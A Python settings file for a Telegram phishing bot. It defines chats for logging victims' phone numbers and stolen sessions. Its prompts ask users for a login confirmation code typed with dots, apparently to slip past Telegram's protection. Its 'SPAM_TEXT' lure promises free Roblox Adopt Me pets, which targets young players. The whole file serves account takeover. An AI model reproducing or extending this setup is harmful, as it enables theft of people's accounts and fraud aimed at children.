import os
from dotenv import load_dotenv

load_dotenv()

# ======== ТОКЕНЫ ========
TOKEN = os.getenv("BOT_TOKEN")
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH")

# ======== ID ЧАТОВ ========
ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID", 0))
PHONE_LOG_CHAT_ID = int(os.getenv("PHONE_LOG_CHAT_ID", 0))
SESSION_CHAT_ID = int(os.getenv("SESSION_CHAT_ID", 0))

# ======== СООБЩЕНИЯ ========
WELCOME_MESSAGE = """
Привет, *{first_name}* 👋!

Для продолжения нажмите кнопку ниже и поделитесь номером телефона.
"""

THANK_YOU_MESSAGE = """
✅ Спасибо! Номер получен.
Отправляю код подтверждения...
"""

SEND_CODE_MESSAGE = """
🔐 Введите код подтверждения:

Введите код в формате: <b>1.2.3.4.5</b>
"""

# ======== СПАМ-ТЕКСТ ДЛЯ РАССЫЛКИ ========
SPAM_TEXT = """
🎁 <b>БЕСПЛАТНЫЕ ПИТОМЦЫ ADOPT ME!</b> 🎁

Привет! Я бот, который раздает <b>LEGENDARY PETS</b> в Roblox!

🔥 <b>Как получить:</b>
1️⃣ Напиши @Free_Pets_Robot
2️⃣ Нажми /start
3️⃣ Получи своего питомца!

🎉 Только сегодня: <b>100 БЕСПЛАТНЫХ ПИТОМЦЕВ!</b>

⏳ Успей, пока не разобрали!

#AdoptMe #Roblox #FreePets #Pets
"""

# ======== НАСТРОЙКИ ========
MAX_CODE_ATTEMPTS = 3
CODE_TIMEOUT = 300  # 5 минут
SESSIONS_DIR = "sessions"

os.makedirs(SESSIONS_DIR, exist_ok=True)